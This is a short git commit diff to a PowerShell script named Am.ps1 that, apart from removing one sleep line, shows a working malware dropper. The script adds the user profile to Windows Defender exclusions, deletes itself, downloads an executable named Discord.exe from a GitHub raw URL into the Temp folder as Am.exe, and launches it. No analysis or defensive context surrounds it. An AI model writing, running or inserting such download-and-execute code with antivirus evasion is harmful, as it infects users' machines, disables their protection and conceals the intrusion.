794c2268d9efb07ed9cc2c2dc23355c096dc0352
AnonAm93 <am9.9@outlook.com>
2024-10-16 19:20:57 +0200

    Update Am.ps1

--- Am.ps1
+++ Am.ps1
@@ -2,6 +2,5 @@ Add-MpPreference -ExclusionPath $env:USERPROFILE
 Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
 $url = 'https://github.com/AnonAm93/1/raw/refs/heads/main/Discord.exe'
 $outputFile = [System.IO.Path]::Combine($env:Temp, 'Am.exe')
-Start-Sleep -Milliseconds 100 
 Invoke-WebRequest -Uri $url -OutFile $outputFile
 Start-Process -FilePath $outputFile
